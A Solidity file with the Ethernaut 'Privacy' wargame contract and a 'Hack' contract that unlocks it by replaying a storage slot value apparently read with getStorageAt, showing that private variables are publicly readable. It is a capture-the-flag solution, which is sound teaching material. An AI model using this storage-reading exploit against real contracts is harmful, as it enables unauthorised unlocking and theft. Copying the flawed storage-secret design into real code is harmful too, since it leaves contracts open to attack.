// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}

contract Hack {
    // create a reference to the original Ethernaut contract instance
    Privacy target = Privacy(0x94BdeBff3c1624a37E532486890D905a9F8db0a6);

    // the payload comes from the getStorageAt(5) method
    bytes32 payload =
        0x4ad5976787dd09ae4d53840d40a6d0a4ed500e54c2883a80a8459b072721437;

    // we convert it to bytes16 (essentially cutting off the last 16 bytes of payload)
    bytes16 public payload16 = bytes16(payload);

    function attack() public {
        // now we can submit the payload to the original instance
        target.unlock(payload16);
    }
}
